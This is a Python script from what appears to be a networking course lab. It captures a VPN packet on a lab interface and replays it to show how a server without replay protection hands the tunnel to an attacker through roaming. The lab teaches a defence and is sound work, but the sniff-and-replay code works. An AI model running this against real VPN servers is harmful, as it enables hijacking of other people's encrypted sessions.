#!/usr/bin/env python3
"""Replay attack on the lab VPN (step 8.2). Run as root in the client namespace, while the VPN runs.

It records the next VPN packet the client sends on veth0, then sends the exact same bytes to the
server again, from its own UDP port. It cannot read or change the packet: it only repeats it.

    sudo python3 scripts/replay.py

Without replay protection the server accepts the copy and takes the attacker's port for the
client's new address (roaming): replies go to the attacker. With it, the copy is dropped.

Theory: _networking-lessons/8-security-cryptography.md#replay-attacks
"""
import socket
import sys

SERVER = ("192.168.100.2", 7000)
ETH_P_ALL = 0x0003  # every protocol: Linux shows outgoing frames only to "all protocols" sockets
ETH_P_IP = 0x0800

# A packet socket sees every frame on veth0, outgoing ones included, like tcpdump.
sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
sniff.bind(("veth0", 0))
sniff.settimeout(15)
print("waiting for the next VPN packet on veth0 (a keepalive comes every 5 s)...")
try:
    while True:
        frame = sniff.recv(65535)
        if int.from_bytes(frame[12:14], "big") != ETH_P_IP:  # EtherType after the two MAC addresses
            continue
        ip = frame[14:]
        if ip[9] != socket.IPPROTO_UDP:
            continue
        udp = ip[(ip[0] & 0x0F) * 4:]  # IHL: IPv4 header length in 32-bit words
        if int.from_bytes(udp[2:4], "big") == SERVER[1]:
            payload = udp[8:]  # the sealed tunnel packet, exactly as the client sent it
            break
except socket.timeout:
    sys.exit("no VPN packet seen on veth0 in 15 s: is the VPN client running?")

print(f"recorded {len(payload)} bytes: {payload[:16].hex(' ')} ...")
attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attacker.sendto(payload, SERVER)
print(f"sent it again from port {attacker.getsockname()[1]}, watch the server log")
attacker.settimeout(2)
try:
    data, _ = attacker.recvfrom(65535)
    print(f"the server answered the attacker: {len(data)} bytes. The tunnel is hijacked.")
except socket.timeout:
    print("no answer: the server dropped the copy.")
